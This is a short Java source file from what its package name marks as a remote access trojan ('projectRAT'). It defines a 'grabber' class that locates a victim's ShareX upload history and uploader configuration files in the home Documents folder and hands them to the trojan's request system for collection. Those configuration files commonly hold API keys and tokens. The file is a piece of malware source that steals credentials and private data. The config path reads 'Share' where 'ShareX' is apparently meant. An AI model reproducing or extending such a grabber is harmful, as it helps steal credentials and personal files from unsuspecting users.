package in.momin5.projectRAT.request.grabbers;

import in.momin5.projectRAT.request.Request;

import java.io.File;

public class ShareXGrabs implements Request {

    File historyFile;
    File configFile;
    @Override
    public void init() throws Exception {
        historyFile = new File(System.getProperty("user.home") + "/Documents/ShareX/" + "History.json");
        configFile = new File(System.getProperty("user.home") + "/Documents/Share/" + "UploadersConfig.json");
    }

    @Override
    public String getMessage() {
        return null;
    }

    @Override
    public File[] getFiles() {
        if(historyFile.exists() && configFile.exists())
            return new File[]{
              historyFile,
              configFile
            };

        return null;
    }
}
